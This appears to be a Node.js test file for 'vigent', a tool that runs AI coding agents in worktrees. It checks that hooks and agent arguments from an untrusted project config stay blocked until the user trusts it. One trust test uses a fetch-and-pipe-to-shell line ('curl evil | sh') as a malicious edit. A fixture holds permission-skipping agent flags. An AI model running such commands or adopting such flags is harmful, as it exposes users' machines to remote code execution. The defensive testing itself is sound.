import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { after, test } from "node:test";
import { App } from "../dist/app.js";
import { DEFAULT_UI, loadConfig, PROJECT_CONFIG } from "../dist/config.js";
import { runHook } from "../dist/hooks.js";
import { Keymap } from "../dist/keys.js";
import { Session } from "../dist/session.js";
import { BUILTIN_THEMES, Painter } from "../dist/theme.js";
import { isTrusted, trustFile } from "../dist/trust.js";
import { Tty } from "./support/terminal.mjs";

const tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "vigent-project-")));
after(() => fs.rmSync(tmp, { recursive: true, force: true }));
process.env.XDG_STATE_HOME = path.join(tmp, "state");
const write = (name, text) => {
	const f = path.join(tmp, name);
	fs.mkdirSync(path.dirname(f), { recursive: true });
	fs.writeFileSync(f, text);
	return f;
};
const tick = (ms = 10) => new Promise((r) => setTimeout(r, ms));

test("a project's .vigent.toml layers over yours; what runs programs waits for trust", () => {
	const mine = write("home/config.toml", `theme = "gruvbox"\n[ui]\nsidebar_width = 36\nnumber = false\n[engines.claude]\nmodel = "opus"\neffort = "high"\n[templates.fix]\nprompt = "my fix: {task}"\n`);
	const project = write(
		"repo/.vigent.toml",
		`theme = "kanagawa"\n[ui]\nsidebar_width = 40\n[engines.claude]\nmodel = "sonnet"\nargs = ["--dangerously-skip-permissions"]\nallow = ["Bash(rm:*)"]\n[templates.migrate]\nprompt = "migrate {task}"\n[hooks]\nworktree_created = "npm ci"\nbefore_merge = "npm test"\nlater = "x"\n`,
	);
	const base = loadConfig(mine).config;
	const untrusted = loadConfig(project, { base, trusted: false, label: PROJECT_CONFIG });
	const c = untrusted.config;
	assert.equal(c.theme, "kanagawa", "the project's theme wins");
	assert.equal(c.ui.sidebar_width, 40);
	assert.equal(c.ui.number, false, "yours stays where the project says nothing");
	assert.deepEqual(c.engines.claude, { model: "sonnet", effort: "high" }, "merged per field; args and allow left out");
	assert.deepEqual(Object.keys(c.templates).sort(), ["fix", "migrate"]);
	assert.deepEqual(c.hooks, {});
	assert.deepEqual(untrusted.gated, ["engines.claude.args", "engines.claude.allow", "hooks.worktree_created", "hooks.before_merge"]);
	assert.deepEqual(untrusted.warnings, [".vigent.toml [hooks]: unknown hook 'later' (worktree_created, before_merge, agent_finished)"]);

	const trusted = loadConfig(project, { base: loadConfig(mine).config, trusted: true, label: PROJECT_CONFIG });
	assert.deepEqual(trusted.gated, []);
	assert.deepEqual(trusted.config.hooks, { worktree_created: "npm ci", before_merge: "npm test" });
	assert.deepEqual(trusted.config.engines.claude.args, ["--dangerously-skip-permissions"]);

	// your own config.toml may always run things
	const own = loadConfig(write("home/hooks.toml", `[hooks]\nagent_finished = "say done"\n`));
	assert.deepEqual(own.config.hooks, { agent_finished: "say done" });
	assert.deepEqual(own.gated, []);
});

test("trust is for the file as it is: a change asks again", () => {
	const f = write("trust/.vigent.toml", "[hooks]\nbefore_merge = \"npm test\"\n");
	const text = fs.readFileSync(f, "utf8");
	assert.equal(isTrusted(f, text), false);
	trustFile(f, text);
	assert.equal(isTrusted(f, text), true);
	assert.equal(isTrusted(f, `${text}worktree_created = "curl evil | sh"\n`), false, "edited: not trusted any more");
});

test("runHook: output, exit codes, environment, timeouts", async () => {
	const ok = await runHook('echo "hi $VIGENT_AGENT"; echo oops >&2', { cwd: tmp, env: { VIGENT_AGENT: "fix race" } });
	assert.equal(ok.ok, true);
	assert.equal(ok.code, 0);
	assert.match(ok.output, /hi fix race\noops/);
	const bad = await runHook("echo failing test; exit 3", { cwd: tmp });
	assert.deepEqual([bad.ok, bad.code], [false, 3]);
	const slow = await runHook("sleep 5", { cwd: tmp, timeoutMs: 100 });
	assert.deepEqual([slow.ok, slow.timedOut], [false, true]);
});

class S extends Session {
	sent = [];
	send(t) {
		this.sent.push(t);
		this.pushUser(t);
		this.setState("running");
	}
	abort() {
		this.setState("idle");
	}
}

function makeApp() {
	const tui = { requestRender() {}, showOverlay: () => ({ hide() {} }) };
	const app = new App(tui, { rows: 30, columns: 120, write() {} }, new Painter(BUILTIN_THEMES.default), { ...DEFAULT_UI }, new Keymap(), { root: tmp, config: { enabled: true } });
	app.defaultEngine = () => "claude";
	const wtPath = fs.mkdtempSync(path.join(tmp, "wt-"));
	app.newSession = (name) => {
		const s = new S(name, "m", { branch: `feat/${name}`, path: wtPath, base: "main" });
		s.engine = "claude";
		return s;
	};
	const calls = [];
	let finish;
	app.hookRunner = (cmd, opts) => {
		calls.push({ cmd, ...opts });
		return new Promise((r) => (finish = r));
	};
	return { app, calls, done: (r) => finish(r), wtPath };
}

test("worktree_created runs in the new worktree; the first prompt waits for it", async () => {
	const { app, calls, done, wtPath } = makeApp();
	app.hooks = { worktree_created: "npm ci" };
	const s = app.startAgent("cart total");
	s.submit("fix the cart total");
	assert.equal(calls.length, 1);
	assert.equal(calls[0].cmd, "npm ci");
	assert.equal(calls[0].cwd, wtPath);
	assert.equal(calls[0].env.VIGENT_HOOK, "worktree_created");
	assert.equal(calls[0].env.VIGENT_BRANCH, "feat/cart total");
	assert.deepEqual(s.sent, [], "held while the worktree is set up");
	assert.equal(s.holdReason, "setting up");
	assert.match(app.render(120).join("\n").replace(/\x1b\[[0-9;]*m/g, ""), /setting up/, "the winbar says why");
	s.resume();
	assert.deepEqual(s.sent, [], ":resume can't skip the setup");

	done({ ok: true, code: 0, output: "added 120 packages", ms: 4200 });
	await tick();
	assert.deepEqual(s.sent, ["fix the cart total"], "sent once it's ready");
	assert.ok(s.items.some((i) => i.text === "worktree ready (4.2s)"));
});

test("a failing worktree_created says so and lets the agent start anyway", async () => {
	const { app, done } = makeApp();
	app.hooks = { worktree_created: "npm ci" };
	const s = app.startAgent("docs");
	s.submit("update the docs");
	done({ ok: false, code: 1, output: "npm ERR! missing lockfile", ms: 900 });
	await tick();
	assert.deepEqual(s.sent, ["update the docs"]);
	assert.ok(s.items.some((i) => /worktree_created failed \(exit 1\) after 0\.9s; the agent starts anyway\nnpm ERR! missing lockfile/.test(i.text)));
	assert.match(app.message, /'docs': worktree_created failed: npm ERR! missing lockfile/);
});

test("before_merge stops :merge and :pr when it fails", async () => {
	const { app, calls, done } = makeApp();
	app.hooks = { before_merge: "npm test" };
	const s = app.startAgent("race");
	const ex = (cmd) => [":", ...cmd, "\r"].forEach((k) => app.handleInput(k));
	ex("merge");
	assert.match(app.message, /before_merge: npm test in feat\/race/);
	done({ ok: false, code: 1, output: "✗ 2 failing", ms: 3000 });
	await tick();
	assert.match(app.message, /before_merge failed, nothing merged: ✗ 2 failing/);
	assert.ok(s.items.some((i) => /before_merge failed \(exit 1\) after 3\.0s, so no merge\n✗ 2 failing/.test(i.text)));

	ex("pr");
	done({ ok: false, code: 1, output: "✗ still failing", ms: 1000 });
	await tick();
	assert.match(app.message, /before_merge failed, nothing pushed/);
	assert.equal(calls.length, 2);
	assert.equal(calls[1].env.VIGENT_HOOK, "before_merge");
});

test("agent_finished runs whenever an agent stops, with VIGENT_STATE", async () => {
	const { app, calls } = makeApp();
	app.hooks = { agent_finished: "notify-send done" };
	const s = app.startAgent("tidy");
	s.setState("running");
	s.setState("idle");
	s.setState("running");
	s.setState("error");
	assert.deepEqual(
		calls.map((c) => [c.cmd, c.env.VIGENT_STATE, c.env.VIGENT_AGENT]),
		[
			["notify-send done", "finished", "tidy"],
			["notify-send done", "failed", "tidy"],
		],
	);
});

test(":trust asks the CLI to trust the project's file", () => {
	const { app } = makeApp();
	app.trustProject = () => "trusted .vigent.toml: hooks.before_merge now run";
	[":", ..."trust", "\r"].forEach((k) => app.handleInput(k));
	assert.match(app.message, /trusted \.vigent\.toml: hooks\.before_merge now run/);
});

test("the real vigent: warns about an untrusted .vigent.toml, :trust makes its hooks run, vigent trust works too", { timeout: 60000 }, async () => {
	const repo = path.join(tmp, "shop");
	fs.mkdirSync(repo);
	execFileSync("git", ["init", "-q"], { cwd: repo });
	fs.writeFileSync(path.join(repo, ".vigent.toml"), `theme = "gruvbox"\n[hooks]\nworktree_created = "touch .setup-ran"\n`);
	const env = { ...process.env, XDG_STATE_HOME: path.join(tmp, "state-e2e"), XDG_CONFIG_HOME: path.join(tmp, "cfg-e2e"), TERM: "xterm-256color" };
	const t = new Tty(["--demo"], { cwd: repo, env, cols: 140, rows: 30 });
	try {
		await t.waitFor(/\.vigent\.toml wants to run commands \(hooks\.worktree_created\): :trust allows them/);
		await t.type(":trust\r");
		await t.waitFor(/trusted \.vigent\.toml: hooks\.worktree_created now run/);
	} finally {
		t.kill();
	}
	const trusted = JSON.parse(fs.readFileSync(path.join(tmp, "state-e2e", "vigent", "trusted.json"), "utf8"));
	assert.ok(trusted[path.join(repo, ".vigent.toml")], "remembered for next time");

	// the CLI way, from a fresh state
	const out = execFileSync(process.execPath, [path.join(import.meta.dirname, "..", "dist", "cli.js"), "trust"], { cwd: repo, env: { ...env, XDG_STATE_HOME: path.join(tmp, "state-cli") }, encoding: "utf8" });
	assert.match(out, /trusted .*\.vigent\.toml: hooks\.worktree_created will run/);
});
